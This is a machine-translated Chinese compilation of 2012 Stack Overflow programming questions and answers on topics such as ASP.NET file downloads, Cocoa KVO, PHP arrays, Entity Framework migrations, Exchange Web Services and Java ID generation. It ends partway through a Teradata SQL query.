> 时间：2012-09-12T20:45:58.463

我会使用 SWIG 的机制来处理继承，并有一个带有虚函数的回调类`void call()`。然后，您使用 SWIG 使该类能够在 Python 中派生。

在 Python 中，您只需确保设置回调的位置，将其包装在派生自 C++ 回调类的 Python 类的实例中，并使其`call`成员函数执行回调。这也是您进行测试以查看它是否可调用的地方。然后，您将`setCallback`使用此包装器对象调用该函数。

# asp.net-mvc-3 - ASP.Net MVC3 应用程序从另一个网络服务器下载文件到客户端

> ID：12392705
> 
> 赞同：2
> 
> 时间：2012-09-12T16:34:29.817
> 
> 标签：asp.net-mvc-3, download

我们目前使用下面的代码将文件从网络服务器下载到旧 ASP.net 页面中的客户端。

我们已经在 MVC3 中重新编写了应用程序，并希望升级此功能。我看过一些帖子声称您可以通过在 web.config 中编写以下行来从网络共享访问该文件

```
<authentication mode="Windows"/>
<identity impersonate="true" userName="" password="" /> 
```

但是，我们目前正在使用 Forms 身份验证模式来登录该站点。这会干扰登录功能吗？

这是我们的下载代码。

```
Partial Class DownloadFile2
   Inherits System.Web.UI.Page

   Private BufferSize As Integer = 32 * 1024

   Private Sub Page_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

      Dim path As String = Request.Params("File")
      path = "\\speedy\wanfiles\" + path.Substring(3)
      Dim file As System.IO.FileInfo = New System.IO.FileInfo(path)
      Dim Buffer(BufferSize) As Byte
      Dim SizeWritten, fileindex As Integer
      Response.Clear()

      Response.AddHeader("Content-Disposition", "attachment; filename=" + file.Name)
      Response.AddHeader("Content-Length", file.Length.ToString)

      Response.ContentType = "application/octet-type"
      Response.Flush()

      fileindex = 0
      Do
         // not sure about this GM.AlasData code below
         SizeWritten = GM.AlasData.ReadFileBlock(file.FullName, Buffer, fileindex, BufferSize) 
         Response.OutputStream.Write(Buffer, 0, SizeWritten)
         Response.Flush()
         If SizeWritten < BufferSize Then
            Exit Do
         Else
            fileindex = fileindex + SizeWritten
         End If
      Loop

      Response.End()

   End Sub

End Class 
```

我发现此代码使用 MVC3 进行下载，但无法访问该文件，因为它被视为本地文件。

```
public FileResult Download(string FilePath)
{
    if (FilePath != null)
    {
        string path = FilePath;
        string contentType;
        // files are stored on network server named speedy
        path = string.Concat(@"\\speedy\files\", HttpUtility.UrlDecode(path));
        System.IO.FileInfo file = new System.IO.FileInfo(path);
        Microsoft.Win32.RegistryKey rk = Microsoft.Win32.Registry.ClassesRoot.OpenSubKey(file.Extension.ToLower());
        if (rk != null && rk.GetValue("Content Type") != null)
        {
            contentType = rk.GetValue("Content Type").ToString();
        }
        else
        {
            contentType = "application/octet-type";
        }

        //Parameters to file are
        //1\. The File Path on the File Server
        //2\. The content type MIME type
        //3\. The parameter for the file save by the browser
        return File(file.FullName, contentType, file.Name);

    }
    else
    {
        return null;
    }
} 
```

需要做什么来解决这个问题，我们可以在哪里执行这个功能？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T02:35:00.190

您可以删除 Authentication mode = windows 行，因为您使用的是表单身份验证。使用模拟并确保该帐户对您尝试访问的网络位置具有读取权限。那应该工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T20:53:21.403

[http://www.codeproject.com/Articles/4051/Windows-Impersonation-using-C](http://www.codeproject.com/Articles/4051/Windows-Impersonation-using-C)

# macos - KVO：没有收到关于 NSTableView 的 -selectedRowIndexes 的通知？

> ID：12392707
> 
> 赞同：3
> 
> 时间：2012-09-12T16:34:37.213
> 
> 标签：macos, cocoa, selection, nstableview, key-value-observing

我正在尝试让 NSTableView 的自定义子类观察其自身`-selectedRowIndexes`属性的值，但我无法弄清楚如何正确接收通知。我的子类看起来像这样（使用 ARC）：

```
@implementation MyTableView

- (id)initWithCoder:(NSCoder *)aDecoder {
    if ((self = [super initWithCoder:aDecoder])) {
        [self addObserver:self forKeyPath:@"selectedRowIndexes" options:NSKeyValueObservingOptionOld | NSKeyValueObservingOptionNew context:NULL];
    }
    return self;
}

- (void)dealloc {
    [self removeObserver:self forKeyPath:@"selectedRowIndexes"];
}

- (void)observeValueForKeyPath:(NSString *)keyPath ofObject:(id)object change:(NSDictionary *)change context:(void *)context {
    NSLog(@"change: %@", change);
}

@end 
```

但是，我从来没有看到`-observeValueForKeyPath:...`被调用。我错过了什么吗？

我也对更好的解决方案持开放态度 - 我想做 KVO 而不是依赖委托的`-tableViewSelectionDidChange:`方法的原因是我想要以前和当前的值`selectedRowIndexes`，而不是仅仅能够获得当前的选择。如果有办法在这个属性上没有 KVO 的情况下做到这一点，我会全力以赴。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-12T18:59:12.473

如果您没有看到 KVO 通知，我会在 bugreport.apple.com 上打开一个雷达。原因很可能是它们不完全符合 KVO。我没有测试过，但我不会感到震惊。

至于如何在没有 KVO 的情况下做到这一点，这相当简单。使用. 检查当前值和要添加的值。返回。~~`tableView:willSelectRowAtIndexPath:`~~ `tableView:shouldSelectRow:``YES`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-01-07T13:55:36.007

我有同样的问题，我找到了解决方案：

将 NSTableView 视图选择索引绑定到数组控制器，键 selectionIndexes

# backbone.js - 骨干样板渲染视图问题

> ID：12392715
> 
> 赞同：0
> 
> 时间：2012-09-12T16:35:10.080
> 
> 标签：backbone.js

我正在使用骨干样板/骨干布局管理器，并且在调用 place.fetch() 后重新渲染视图时遇到问题。第一次似乎工作正常，但是当我第二次获取时，“渲染”方法不再被调用。

任何提示都会有所帮助

谢谢

皮特

路由器

```
test: function() {
    var place = new Place.Model({
      place_id: place_id,
    });
    place.fetch().complete(function(){

    app.useLayout("main").setViews({
        ".place-detail": new Place.Views.Show({
          model: place
        })
      }).render();
   });
} 
```

看法

```
initialize: function() {
  _.bindAll(this, "render");
 this.model.on("change", this.render, this);
}

render: function(manage) {
  return manage(this).render();
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T16:51:59.080

`fetch`是一个异步函数，它接受带有`success`或`error`处理程序的对象，该处理程序将在完成时调用。AFAIK`fetch`不支持与处理程序链接的 jQuery 方法，因此如果您希望在完成时调用它，则`complete`需要将对象传递给设置了正确方法的对象。`success`

# php - PHP数组和非唯一键问题

> ID：12392721
> 
> 赞同：1
> 
> 时间：2012-09-12T16:35:32.423
> 
> 标签：php

我正在构建一个日历应用程序，它允许我们的管理团队输入员工假期、培训天数、病假天数等，并且所有员工都可以查看任何一天谁进出。日历是按照记录休息日的机制构建的。我正在努力显示谁什么时候下班。使用 print_r 我从服务器返回以下信息，显示姓名、日期和缺席原因：

```
Array ( 
[0] => stdClass Object ( [name] => Becca [date] => 2012-10-10  [reason] => Sick ) 
[1] => stdClass Object ( [name] => Frank [date] => 2012-09-12 [reason] => Sic ) 
[2] => stdClass Object ( [name] => Frank [date] => 2012-10-14 [reason] => Sic ) 
[3] => stdClass Object ( [name] => Paola [date] => 2012-10-10 [reason] => Sic ) 
[4] => stdClass Object ( [name] => Clive [date] => 2012-10-14 [reason] => Hol ) ) 
```

我可以遍历并显示一些姓名和日期，但如果在给定日期有多个人离开（例如 Becca、Paola），我相信只显示姓氏，因为密钥必须是唯一的。以下代码执行此操作，其中 'date("Ymd", $date)' 是在日历上打印日期的方法：

```
foreach ($absenceArray as $dateofabsence=>$name){
    if (date("Y-m-d", $date) == $dateofabsence){
        $showname[$x] = $name; 
    }   
} 
```

有人可以演示我如何遍历上述数组并将每个名称链接到我日历中的相应日期。

我很抱歉，我无疑没有正确解释自己，但我的大脑已经疲惫不堪。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-12T16:48:10.360

如果您想查看在给定日期缺席的人，我将首先解析数组以具有基于日期的数组作为键。尤其是在您想将这些内容添加到日历中的环境中，它可能会很有用。

```
$absenceByDate = array();
foreach ($absenceArray as $index => $record) {
    if (!array_key_exists($record->date, $absenceByDate)) {
        $absenceByDate[$record->date] = array();
    }

    $absenceByDate[$record->date][] = $record; 
} 
```

现在您将拥有一个基于日期（作为键）的漂亮数组，您可以简单地循环浏览日历并检查是否存在具有当前日期键的项目。如果是这样的话，至少有一个人缺席。[有关工作示例，请参阅演示](http://codepad.viper-7.com/7j2QyY)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-12T16:51:04.613

当遍历这个数组时，键将是数字，“值”将是一个对象，正如您在 print_r 转储中看到的那样。所以要走的路是这样的：

```
$showname = array();
foreach($absenceArray as $object)
{
  if(date("Y-m-d", $date) === $object->date)
  {
    $showname[] = $object->name;
  }
} 
```

# entity-framework - 实体框架迁移器的连接

> ID：12392722
> 
> 赞同：2
> 
> 时间：2012-09-12T16:35:37.120
> 
> 标签：entity-framework, ef-code-first, entity-framework-migrations

使用 Entity Framework 5.0，我试图在 MVC 站点的启动例程期间手动迁移我的代码优先数据库。为此，我首先创建一个 DbContext 实例，然后运行以下代码：

```
var migrator = new MigrateDatabaseToLatestVersion<DataContext, Configuration>();
migrator.InitializeDatabase(this.dataContext); 
```

我假设与 dataContext 的连接关联的数据库将是迁移的数据库。但似乎情况并非如此。相反，它总是尝试迁移本地 SQLExpress 实例上的数据库。

MigrateDatabaseToLatestVersion 构造函数有一个重载，它采用 DB 连接字符串名称，但我的项目使用的是 Azure，并且不使用标准的 ConnectionStrings 配置部分。理想情况下，我只需向它传递一个可用的连接字符串。这可能吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-13T19:12:02.583

解决方案是完全绕过 MigrateDatabaseToLatestVersion 类。它只是 DbMigration 类的一个薄包装器，如[源代码所示](http://entityframework.codeplex.com/SourceControl/changeset/view/7fb31c1526d0#src/EntityFramework/MigrateDatabaseToLatestVersion%60.cs)。

最后，我写了以下代码：

```
var database = this.dataContext.Database;
var migrationConfiguration = new Configuration();
migrationConfiguration.TargetDatabase = new DbConnectionInfo(database.Connection.ConnectionString, "System.Data.SqlClient");
var migrator = new DbMigrator(migrationConfiguration);
migrator.Update(); 
```

# python - python - 如何从列表中的多个字符串中打印 1 个字符串

> ID：12392723
> 
> 赞同：1
> 
> 时间：2012-09-12T16:35:36.683
> 
> 标签：python, string, list

我在[Andrew N. Harrington 的动手 Python 教程中找到“](http://anh.cs.luc.edu/python/hands-on/3.1/handsonHtml/index.html)[加入所有练习](http://anh.cs.luc.edu/python/hands-on/3.1/handsonHtml/loops.html#join-all-exercise)”的解决方案时遇到了一些麻烦。

基本上，练习是获取一个`['very', 'hot', 'day']`仅由字符串组成的列表，并从中制作一个字符串，在这种情况下`'veryhotday'`。

[这是练习](http://anh.cs.luc.edu/python/hands-on/3.1/examples/joinAllStub.py)：

```
'''exercise to complete and test this function'''
def joinStrings(stringList):
    '''Join all the strings in stringList into one string,
    and return the result, NOT printing it. For example:
    >>> s = joinStrings(['very', 'hot', 'day'])
    >>> print(s)  # I can print s OUTSIDE joinStrings
    'veryhotday'
    '''
    # finish the code for this function

def main():
    print(joinStrings(['very', 'hot', 'day']))
    print(joinStrings(['this', 'is', 'it']))
    print(joinStrings(['1', '2', '3', '4', '5']))

main() 
```

所以只有第一个定义可以改变。我是这样解决的：

```
def joinStrings(stringList):
    return ''.join(stringList) 
```

我相信这是有效的并且是正确的。如果我在这里错了，请纠正我，但问题是它必须以不同的方式解决。我必须累积不同的字符串。就像他们在这里用整数显示的那样：

```
def sumList(nums):
    ’’’Return the sum of the numbers in the list nums.’’’
    sum = 0
    for num in nums:
        sum = sum + num
    return sum 
```

真的我无法弄清楚，所以请帮助我！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-12T16:41:46.623

`''.join(stringList)`是正确的方法。问题是什么？

如果必须以不同的方式完成，您可以执行以下操作之一：

```
import operator
return reduce(operator.add, stringList) 
```

甚至

```
s = ''
for string in stringList:
    s = s + string
return s 
```

但这是不必要的复杂性，因为`join`按照您的建议使用是最简单和首选的方式。应该也是最快的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-12T16:42:22.837

看看[str.join()](http://docs.python.org/library/stdtypes.html#str.join)方法

```
''.join(['a','b','c']) # 'abc'
' '.join(['a','b','c']) # 'a b c'
print ' are '.join(['how', 'you']) # > how are you
s = ''.join(['%d'%i for i in range(10)]) # 01234567789 
```

该`str.join()`函数不打印任何内容，它只是从字符串列表中创建一个新字符串。

# java - 如何在 Java 中的类中同步系统时间访问

> ID：12392732
> 
> 赞同：0
> 
> 时间：2012-09-12T16:36:10.513
> 
> 标签：java, time, system, synchronized

我正在编写一个类，当被调用时将调用一个方法来使用系统时间来生成一个唯一的 8 字符字母数字作为参考 ID。但我担心在某些时候，可能会在同一毫秒内进行多个调用，从而导致相同的参考 ID。如何保护对系统时间的调用免受可能同时调用此方法的多个线程的影响？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-12T16:46:54.430

系统时间是唯一 ID 的不可靠来源。而已。不要使用它。您需要某种形式的永久源（UUID 使用安全随机，种子由操作系统提供）

系统时间甚至可能会向后跳几毫秒，并完全搞砸你的逻辑。如果您只能容忍 64 位，您可以使用[High/Low 生成器](https://stackoverflow.com/questions/282099/whats-the-hi-lo-algorithm)，这是一个非常好的折衷方案，或者自己制作食谱：例如自 2012 年初以来的 18 位天（您还有 700 多年的时间），然后 46 位的随机性来自SecureRandom - 不是最好的情况，从技术上讲它可能会失败，但它不需要外部持久性。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-12T17:06:00.420

我建议将[threadID](http://msdn.microsoft.com/en-us/library/windows/desktop/ms683183%28v=vs.85%29.aspx)添加到参考 ID。这将使参考更加独特。然而，即使在一个线程内对时间源的连续调用也可能传递相同的值。即使调用最高分辨率源（[QueryPerformanceCounter](http://msdn.microsoft.com/en-us/library/windows/desktop/ms644904%28v=vs.85%29.aspx)）也可能在某些硬件上产生相同的值。此问题的一个可能解决方案是针对其前身测试收集的时间值，并将增量项添加到“时间戳”。当这应该是人类可读的时，您可能需要超过 8 个字符。时间戳的最有效来源是 GetSystemTimeAsFileTime API。[我在这个](https://stackoverflow.com/a/11743614/1504523)答案中写了一些细节。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-12T17:25:13.003

您可以使用`UUID`该类为您的 ID 生成位，然后使用一些位运算符并将`Long.toString`其转换为 base-36（字母数字）。

```
public static String getId() {
    UUID uuid = UUID.randomUUID();
    // This is the time-based long, and is predictable
    long msb = uuid.getMostSignificantBits();
    // This contains the variant bits, and is random
    long lsb = uuid.getLeastSignificantBits();
    long result = msb ^ lsb; // XOR
    String encoded = Long.toString(result, 36);
    // Remove sign if negative
    if (result < 0)
        encoded = encoded.substring(1, encoded.length());
    // Trim extra digits or pad with zeroes
    if (encoded.length() > 8) {
        encoded = encoded.substring(encoded.length() - 8, encoded.length());
    }
    while (encoded.length() < 8) {
        encoded = "0" + encoded;
    }
} 
```

由于与 相比，您的字符空间仍然更小`UUID`，因此这并非万无一失。使用以下代码对其进行测试：

```
public static void main(String[] args) {
    Set<String> ids = new HashSet<String>();
    int count = 0;
    for (int i = 0; i < 100000; i++) {
        if (!ids.add(getId())) {
            count++;
        }
    }
    System.out.println(count + " duplicate(s)");
} 
```

对于 100,000 个 ID，代码的性能非常一致并且非常快。~~当我将另一个数量级增加到 1,000,000 时，我开始获得重复的 ID。~~我修改了修剪以采用编码字符串的结尾而不是开头，这大大提高了重复 ID 率。现在拥有 1,000,000 个 ID 对我来说不会产生任何重复。

您最好的选择可能仍然是使用同步计数器，`AtomicInteger`或`AtomicLong`使用上面的代码以 base-36 编码数字，特别是如果您计划拥有大量 ID。

* * *

**编辑：**计数器方法，以防万一：

```
private final AtomicLong counter;

public IdGenerator(int start) {
    // start could also be initialized from a file or other
    // external source that stores the most recently used ID
    counter = new AtomicLong(start);
}

public String getId() {
    long result = counter.getAndIncrement();
    String encoded = Long.toString(result, 36);
    // Remove sign if negative
    if (result < 0)
        encoded = encoded.substring(1, encoded.length());
    // Trim extra digits or pad with zeroes
    if (encoded.length() > 8) {
        encoded = encoded.substring(0, 8);
    }
    while (encoded.length() < 8) {
        encoded = "0" + encoded;
    }
} 
```

此代码是线程安全的，可以并发访问。

# scale - layer.setScale() 线性/最近邻缩放？

> ID：12392737
> 
> 赞同：0
> 
> 时间：2012-09-12T16:36:34.010
> 
> 标签：scale, playn

我正在使用低分辨率图形，并瞄准复古像素化外观。然而， layer.setScale() 似乎在放大时平滑了图形。并且该函数不带任何参数。

无论如何要改变缩放的方式？我不完全确定正确的术语是什么，但我使用“线性”或“最近邻”缩放来实现其他框架中的效果。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-16T13:17:54.180

[Playn 示例 - 如何使用 Android res 文件夹作为资源目录？](https://stackoverflow.com/questions/11432674/playn-sample-how-can-i-use-android-res-folder-as-resources-directory)

根据该链接，您可以使用类似

```
graphics().ctx().setTextureFilter(GLContext.Filter.NEAREST, GLContext.Filter.NEAREST); 
```

# wcf-data-services - 在 OdataQueryOperation 中过滤

> ID：12392743
> 
> 赞同：0
> 
> 时间：2012-09-12T16:36:49.583
> 
> 标签：wcf-data-services, odata

我正在为 RavenDB 中的某些数据结构创建自定义数据服务提供程序。

我正在使用 WCF 数据服务工具包中的 ODataContext，并且查询的某些部分像 TOP / SKIP 等一样工作。

```
public IEnumerable<Movie> GetAll(ODataQueryOperation operation)
{           
    IQueryable<Movie> query;
    if (operation.TopCount != 0)
        query = _session.Query<Movie>().Skip(operation.SkipCount).Take(operation.TopCount);
} 
```

此代码支持以下查询：

```
http://<url>/oDataService.svc/Movies?$top=2 
```

**但我无法使过滤工作。**

operation.FilterExpression 具有类型表达式，并且具有值：it=>(it.ReleaseYear == 2012)。我尝试了下面的代码，但“表达式”的值变为空。

```
Expression<Func<Movie, bool>> expression = operation.FilterExpression as Expression<Func<Movie, bool>>;
query = _session.Query<Movie>().Where(expression); 
```

从浏览器触发的查询如下：

http:///oDataService.svc/Movies?$filter = ReleaseYear eq 2012

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T06:55:32.833

如果您想获得实际的表达式，可以尝试以下操作

```
var where = (operation.FilterExpression as UnaryExpression).Operand as Expression<Func<Movie, bool>> 
```

这将提供一种`Expression<Func<Movie,bool>>`您可以直接与 IQueryable 一起使用的类型。

```
query = _session.Query<Movie>().Where(where); 
```

# bash - 通过 ssh 远程调用 shell 源函数

> ID：12392744
> 
> 赞同：1
> 
> 时间：2012-09-12T16:36:49.913
> 
> 标签：bash, shell, ssh

我有通过远程主机 A 上的 .bashrc 文件获取的函数。如果我在远程主机 A 上使用“which”，我将获取函数体作为输出。我需要从另一台主机 B 通过 ssh 远程运行它。目前，我所有的尝试都以“找不到命令错误”结束。我已经尝试传递给

```
ssh A  "source /home/user/.bashrc && function " 
```

，这无济于事。还尝试强制 ssh 使用 -t 键来设置伪 tty。两台主机上的 SHELL 都是 bash。主机 A 上的 ssh localhost 仍然保持功能状态可用。

输出 ：

```
[user@hostA ~]$ which status
status is a function
status ()
{
    dos -s $*
}

[user@hostB ~]$ ssh hostA " source  /home/user/deploy/bin/_bashrc && status all "
ls: : No such file or directory
bash: status: command not found 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T16:42:02.230

基本上，你不能。为此，您需要复制远程主机上的源文件并在其中获取源文件。请注意，您的文件也可能来自其他一些文件……这几乎就像在远程主机上运行本地程序一样。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-04-23T16:59:47.000

诀窍是让远程端正确地将包含该函数的文件加载到 shell 环境中。

我用 bash 发现以下工作...将您的功能放入遥控器上的 .bashrc 中：

```
foo_func()
{
    echo Hello World
} 
```

然后在本地：

`ssh user@remote bash -l -c foo_func`

指示 bash作为`bash -l`登录 shell（采购启动文件）运行，然后`-c`告诉 shell 执行 string `foo_func`。

# css - HTML-CSS：按钮内的跨度向右对齐

> ID：12392748
> 
> 赞同：1
> 
> 时间：2012-09-12T16:37:01.717
> 
> 标签：css, button, alignment, html

我在对齐标签中`span`包含的 a时遇到问题。`button`

我之前已经做过类似的事情并且它奏效了。实际上，它是相同的 css，但大小不同。

问题是包含`span`似乎向右对齐。

![在此处输入图像描述](../Images/f7aa85d7dd437575d41136086de780ec.png)

CSS：

```
#closePreviewBtn {
    position: absolute;
    height: 24px;
    width: 24px;
    right: 0;
    background: #B9DEFD;
    border-top: solid 1px #333333;
    border-left: solid 1px#333333;
    border-right: solid 1px #333333;
    border-bottom: solid 1px #333333;
    border-radius: 4px;
}

#closePreviewBtn .close {
    display: inline-block;
    position: relative;
    height: 20px;
    width: 20px;
    background: url(../imagenes/close.png) no-repeat center;
    padding: 0;
    /*right: 2px; 
    bottom: 1px;*/ //This fixes the problem but it's manual
} 
```

HTML：

```
<html>
<body>
<button id="closePreviewBtn" name="closePreviewBtn"><span class="close"></span></button>
</body>
</html> 
```

非常感谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-12T18:32:20.867

简单的修复 - 默认情况下，按钮似乎有一个填充。只需将其设置为 0：

```
#closePreviewBtn {
  padding: 0;
} 
```

现在你可以随意定位——如果你想移动它，可能会在跨度上添加一个边距。

希望对你有帮助，

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-12T18:36:32.927

在您的`#closePreviewBtn`规则中，删除`right:0;`. 将位置设置为绝对位置并将右侧设置为零会将元素从文档流中取出，并将其放置在尽可能靠右的位置。

**[jsFiddle 示例](http://jsfiddle.net/j08691/z2VyQ/)**

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-12T19:26:25.020

我注意到该按钮在将其调整为 10 像素后仍有一些填充。我发现没有办法关闭那个空间。

我发现将其居中的解决方案是删除按钮的高度和宽度，因为它会展开以包裹`span`并居中。

对于一些奇怪的事情，它适用于小按钮。但是对于像 30px x 50px 这样的较大按钮，设置高度和宽度就可以了，或者至少如果有一些填充很难注意到。

# php - 如何通过 Exchange 中的 SOAP 从“根”递归获取所有子文件夹？

> ID：12392749
> 
> 赞同：0
> 
> 时间：2012-09-12T16:37:05.307
> 
> 标签：php, soap, exchange-server

在网上搜索了几个小时后，你是我最后的希望：

我必须构建一个系统来读取来自 Microsoft Exchange Server 的发送和传入邮件。我为此找到了以下脚本：Exchange-Web-Services-for-PHP (Heartspring) [https://github.com/Heartspring/Exchange-Web-Services-for-PHP](https://github.com/Heartspring/Exchange-Web-Services-for-PHP)

现有的 get_messages() 函数返回文件夹的所有消息，例如“收件箱”。到目前为止，一切都清楚了。当我想从“已发送”-文件夹中获取所有消息时，我的问题就开始了-我尝试了很多词，从“发送”到“已发送邮件”；没有任何结果（邮箱不可用）

我的想法是获取文件夹“root”的所有子文件夹并写下：

```
include "init.php";

$ec = new ExchangeClient();
$ec->init("bambullis@123.de", "", NULL, "https://amxprd3610.outlook.com/EWS/Services.wsdl");

$folders = $ec->get_subfolders("root"); 

foreach($folders as $folder) {

    print_r($folder); 

} 
```

这就是我得到的：

```
stdClass Object
(
    [FolderId] => stdClass Object
        (
            [Id] => AAAeAGJhbWJ1bGxpc0BzdHVrZSbi5kZQAuAAAAAABw352p5E4yS5voYF9ELBmiAQBXYPdO6NZAQ6T9C3xviT7xAAAAC1iXAAA=
            [ChangeKey] => AQAAABYAAABXYPdO6NZAQ6T9C3xviAALNCey
        )

    [DisplayName] => Oberste Ebene des Informationsspeichers
    [TotalCount] => 0
    [ChildFolderCount] => 16
    [UnreadCount] => 0
) 
```

（我知道 FolderId->Id 是 base64 编码的，出于安全原因，我已经修改了上面的字符串；o））

现在我试图列出这个目录的子文件夹（我添加了一个邮箱来查看，如果值“ChildFolderCount”会改变，它会改变）：

```
...
print_r($folder); 

print_r($ec->get_subfolders($folder->FolderId->Id)); 
... 
```

这是我得到的错误：请求模式验证失败：“Id”属性无效

我做错什么了？如何递归地从“root”获取所有子文件夹？感谢这个可以帮助我的可爱的人！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-15T19:08:45.110

EWS-PHP [get_subfolders](https://github.com/Heartspring/Exchange-Web-Services-for-PHP/blob/master/lib/ExchangeClient.php#L442)方法默认使用[TraversalType](http://msdn.microsoft.com/en-us/library/exchange/exchangewebservices.folderquerytraversaltype%28v=exchg.140%29.aspx) “ **Shallow** ”，因此它**仅搜索已识别的文件夹**并仅返回未删除项目的文件夹 ID。
要在已识别父文件夹的**所有子文件夹**中搜索并仅返回未删除项目的文件夹 ID，您应该使用“ **Deep** ”TraversalType。
例如：

```
<?php

include "init.php";

class myExchangeClient extends ExchangeClient {
    public function get_subfolders_deep($ParentFolderId = "inbox", $Distinguished = TRUE) {
        $this->setup();

        $FolderItem = new stdClass();
        $FolderItem->FolderShape = new stdClass();
        $FolderItem->ParentFolderIds = new stdClass();

        $FolderItem->FolderShape->BaseShape = "Default";
        /* 
        **  See http://msdn.microsoft.com/en-us/library/exchange/exchangewebservices.folderquerytraversaltype(v=exchg.140).aspx 
        **  Deep Traversal: Searches in all subfolders of the identified parent folder and returns only the folder IDs for items that
        **  have not been deleted.
        */
        $FolderItem->Traversal = "Deep";

        if ($Distinguished) {
          $FolderItem->ParentFolderIds->DistinguishedFolderId = new stdClass();
          $FolderItem->ParentFolderIds->DistinguishedFolderId->Id = $ParentFolderId;
        } else {
          $FolderItem->ParentFolderIds->FolderId = new stdClass();
          $FolderItem->ParentFolderIds->FolderId->Id = $ParentFolderId;
        }

        $response = $this->client->FindFolder($FolderItem);

        if ($response->ResponseMessages->FindFolderResponseMessage->ResponseCode == "NoError") {
          $folders = array();

          if (!is_array($response->ResponseMessages->FindFolderResponseMessage->RootFolder->Folders->Folder)) {
              $folders[] = $response->ResponseMessages->FindFolderResponseMessage->RootFolder->Folders->Folder;
          } else {
              $folders = $response->ResponseMessages->FindFolderResponseMessage->RootFolder->Folders->Folder;
          }

          return $folders;
        } else {
          $this->lastError = $response->ResponseMessages->FindFolderResponseMessage->ResponseCode;
        }
    }
}

$ec = new myExchangeClient();
$ec->init("bambullis@123.de", "", NULL, "https://amxprd3610.outlook.com/EWS/Services.wsdl");

$folders = $ec->get_subfolders_deep("root");
echo "<pre>".print_r($folders,true)."</pre>\n";

?> 
```

无论如何，查看[ExchangeClient](https://github.com/Heartspring/Exchange-Web-Services-for-PHP/blob/master/lib/ExchangeClient.php#L178)类源代码，发送项目的 FolderID 应该是“ **sentitems** ”。

# java - 什么时候创建实例成员？

> ID：12392751
> 
> 赞同：3
> 
> 时间：2012-09-12T16:37:10.857
> 
> 标签：java, reference

我有 2 段来自 Java 的代码：

```
class Test1 {
  index = 1;
  int index;
} 
```

相对

```
class Test2 {
  { index = 1; }
  int index; 
} 
```

第一个编译失败，我猜是因为在定义之前使用了成员“索引”？第二个是没有错误的。我不明白为什么。你们能抽出几分钟来帮助我吗？非常感谢！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-12T16:43:42.877

第二个编译，因为第二个代码中存在的 { ... } 内部构造是所谓的[初始化块](http://docs.oracle.com/javase/tutorial/java/javaOO/initial.html)。Java 编译器将该块复制到每个构造函数中。

而且，与任何其他类方法一样，它可以使用该类中定义的属性；该属性的确切定义位置无关紧要 - 在此块之上或之前。

第一个不能编译，因为它根本不符合类体和成员声明的[语言规范](http://docs.oracle.com/javase/specs/jls/se7/html/jls-8.html#jls-8.1.6)，它基本上定义了七个允许的东西：

1.  InstanceInitializer（这里使用的构造）
2.  StaticInitializer（类似于第一个，但在类加载时执行）
3.  构造函数声明
4.  字段声明
5.  方法声明
6.  类声明
7.  接口声明

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-12T17:54:44.847

```
class Test2 {
  { index = 1; }
  int index; 
} 
```

在上面的代码`{ index = 1; }`中称为 as `Instance initializer block`，它用于**初始化类的实例变量，****就像** 初始化类`static initializer block`的**静态变量**一样。

`Java Compiler`会将**这段代码复制到 each** `constructor`中，方便每个构造函数共享这段代码......

因此**，无论在类中的位置如何**（`instance variable`即之前或之后）`Instance initializer block`，它仍然可以访问。

**请参阅此链接：**

[http://docs.oracle.com/javase/tutorial/java/javaOO/initial.html](http://docs.oracle.com/javase/tutorial/java/javaOO/initial.html)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-12T17:06:23.087

test2 编译是因为使用了 Initiallizer，它是编译是因为在调用任何构造函数之前调用了 initiallizer。

# sql - “SELECT DISTINCT”查询带回太多唯一行

> ID：12392755
> 
> 赞同：2
> 
> 时间：2012-09-12T16:37:33.713
> 
> 标签：sql, teradata

在这个阶段我正在处理一个相对简单的查询，我想知道当列数据（状态）发生变化时如何导出单行数据。我知道这听起来很混乱，我只是不知道如何正确表达，所以我只是要告诉你！

我正在尝试提取列 (whse_load_ts) 中的最高日期戳，其中列 (whse_ac) 的值不为 Y。我希望它返回一行。

```
C_CLM   C_STA_CLM   WHSE_ACTN_CD    WHSE_CURR_ROW_IND   WHSE_LOAD_TS
12056733           AC                  U                     2012-05-30 03:18:12 
```

由于状态 c_sta_clm 的变化，当前它返回两行。

```
C_CLM     C_STA_CLM  WHSE_ACTN_CD   WHSE_CURR_ROW_IND         WHSE_LOAD_TS
12056733         AC             U                      2012-05-30 03:18:12
12056733         PC             U                      2012-04-28 03:19:38 
```

此特定声明的所有数据如下所示：

```
 12056733   PC  I       2012-02-04 03:20:25.150
 12056733   PC  U       2012-02-07 03:19:43.230
 12056733   PC  U       2012-02-11 03:21:31.440
 12056733   PC  U       2012-04-28 03:19:38.380
 12056733   AC  U       2012-05-17 03:18:25.920
 12056733   AC  U       2012-05-19 03:20:33.200
 12056733   AC  U       2012-05-30 03:18:12.370
 12056733   TE  U   Y   2012-06-06 03:20:07.520 
```

查询如下

```
SELECT 
    c_clm,
    c_sta_clm,
    whse_curr_row_ind,
    max(whse_load_ts) as "Loaded"
FROM 
    pearl_p.TLTC900_CLM_PRSST
WHERE 
